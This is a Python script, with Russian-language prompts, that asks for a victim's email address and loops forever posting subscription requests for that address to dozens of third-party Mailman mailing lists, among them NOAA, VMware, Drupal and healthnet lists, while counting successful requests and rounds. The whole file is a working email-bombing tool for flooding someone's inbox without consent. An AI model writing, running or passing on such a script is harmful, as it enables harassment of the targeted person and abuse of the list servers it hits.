import requests, time
import fake_useragent
from colorama import *

phone = input("Введите почту: ")

x = 0
y = 0
z = 0

while True:
  
  try:
    a = requests.post("http://coral.aoml.noaa.gov/mailman/subscribe/cdhc?email="+phone)
    x += 1
    print("Успешных запросов:", x)
    print("Не успешных запросов:", y)
  except:
  	y += 1
  try:
    a = requests.post("http://coral.aoml.noaa.gov/mailman/subscribe/coral-list?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://coral.aoml.noaa.gov/mailman/subscribe/cdhc?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://starj.com/mailman/subscribe/headlines_starj.com?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://starj.com/mailman/subscribe/headlines_starj.com?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://lists.vmware.com/mailman/subscribe/security-announce?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://lists.drupal.org/mailman/subscribe/security-internals?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://lists.drupal.org/mailman/subscribe/security-news?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://lists.vmware.com/mailman/subscribe/security-announce?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://chilli.nosignal.org/cgi-bin/mailman/subscribe/uknot?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://chilli.nosignal.org/cgi-bin/mailman/subscribe/uknot-jobs?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://list.healthnet.org/mailman/subscribe/india-drug?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://list.healthnet.org/mailman/subscribe/india-drug?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://list.healthnet.org/mailman/subscribe/pronut-hiv?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://list.healthnet.org/mailman/subscribe/pronut-hiv?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://chilli.nosignal.org/cgi-bin/mailman/subscribe/curry?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://gator2004.hostgator.com/mailman/subscribe/gossip_queensoflasvegas.com?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://gator2004.hostgator.com/mailman/subscribe/gossip_queensoflasvegas.com?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://coral.aoml.noaa.gov/mailman/subscribe/cdhc?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://coral.aoml.noaa.gov/mailman/subscribe/coral-list?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://coral.aoml.noaa.gov/mailman/subscribe/cdhc?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://starj.com/mailman/subscribe/headlines_starj.com?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://starj.com/mailman/subscribe/headlines_starj.com?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://lists.vmware.com/mailman/subscribe/security-announce?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://lists.drupal.org/mailman/subscribe/security-internals?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://lists.drupal.org/mailman/subscribe/security-news?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://lists.vmware.com/mailman/subscribe/security-announce?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://chilli.nosignal.org/cgi-bin/mailman/subscribe/uknot?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://chilli.nosignal.org/cgi-bin/mailman/subscribe/uknot-jobs?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://list.healthnet.org/mailman/subscribe/india-drug?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://list.healthnet.org/mailman/subscribe/india-drug?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://list.healthnet.org/mailman/subscribe/pronut-hiv?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://list.healthnet.org/mailman/subscribe/pronut-hiv?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://chilli.nosignal.org/cgi-bin/mailman/subscribe/curry?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://gator2004.hostgator.com/mailman/subscribe/gossip_queensoflasvegas.com?email="+phone)
    x += 1
  except:
  	y += 1
  try:
    a = requests.post("http://gator2004.hostgator.com/mailman/subscribe/gossip_queensoflasvegas.com?email="+phone)
    x += 1
    z += 1
    print("Пройдено кругов:", z)
  except:
  	y += 1
